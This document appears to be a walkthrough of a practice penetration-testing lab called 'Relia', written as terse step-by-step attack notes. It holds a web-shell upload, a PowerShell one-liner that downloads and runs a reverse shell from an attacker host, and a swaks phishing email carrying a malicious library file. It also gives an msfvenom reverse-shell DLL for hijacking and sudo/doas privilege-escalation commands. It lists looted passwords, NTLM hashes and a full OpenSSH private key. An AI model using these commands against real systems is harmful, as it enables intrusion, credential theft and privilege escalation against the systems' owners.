# Relia

## Legacy .249

### Web

go to [http://192.168.105.249:8000/cms/admin.php](http://192.168.105.249:8000/cms/admin.php) and login with admin:admin

then [https://www.exploit-db.com/exploits/50616](https://www.exploit-db.com/exploits/50616)

upload the web shell and then go on [http://192.168.105.249:8000/cms/files/shell.pHp?cmd=dir](http://192.168.105.249:8000/cms/files/shell.pHp?cmd=dir) to launch a reverse shell&#x20;

```
iex (iwr -UseBasicParsing http://192.168.105.250/Invoke-PowerShellTcp.ps1)
```

you have connettivity only on the given machine (.250)

### privesc

use godpotato

in powershell history at C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine there are damon credential

damon : i6yuT6tym@

## External .248

Enumerate smb and get the kdbx file. Crack it.

Enter with remmina

wit winpeas we can find the appkey `!8@aBRBYdb3!` that is mark password

## WEB02 .245



## Mail .189

Download /staging/.git from .249 to analyze the commits

maildmz@relia.com:ls -

now use this attack [https://github.com/gustanini/WinLib\_Gen](https://github.com/gustanini/WinLib_Gen)

{% code overflow="wrap" %}
```
sudo swaks  -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap 
```
{% endcode %}

\
and get a remote shell from .146.14 inside the internal network

### 16.x.14 / WK01

Crack the kdbx in the documents folder of jim to found password "mercedes1" of kdbx.

Inside all the passwords.

dmzadmin:SlimGodhoodMope

jim@relia.com:Castello1!

use rubeus to asperoast and get the michelle credentials

michelle : NotMyPassword0k? &#x20;

### 16.x.7

we can rdp as michelle

We have a service: _C:\Scheduler\scheduler.exe_ that has a dependency **customlib.dll**.

We will get the executable on our machine and analyze it for DLL hijacking.

Check this: [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#finding-missing-dlls](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#finding-missing-dlls)

We will find: **beyondhelper.dll** is missing.

We will create a malicious DLL (make sure to use x64 arch).

{% code overflow="wrap" %}
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.227 LPORT=80 -f dll -o beyondhelper.dll
```
{% endcode %}

Administrator::8b4547a5116dd13e6e206d1286a06b28

andrea:PasswordPassword\_6:ce3f12443651168b3793f5fbcccff9db

### 16.x.15

login with rdp using andrea credentials

Now modify the schedule.ps1 to launcha reverse shell

on documents we found kdbx with password : destiny1

milana : 2237ff5905ec2fd9ebbdfa3a14d1b2b6

sarah private key

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### 16.x.19

enter with sarah id\_rsa

borg privesc&#x20;

```
sudo /usr/bin/borg extract @:/::: --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
```

loot:

amy : 0814b6b7f0de51ecf54ca5b6e6e612bf

andrew : Rb9kNokjDsjYyH

### 16.x.20

login as andrew.

start apache with `doas service apache24 onestart`  and write a web shell in the apache folder.

then use it to add andrew to the wheel group

```
/usr/local/bin/doas+pw+usermod+andrew+-G+wheel
```

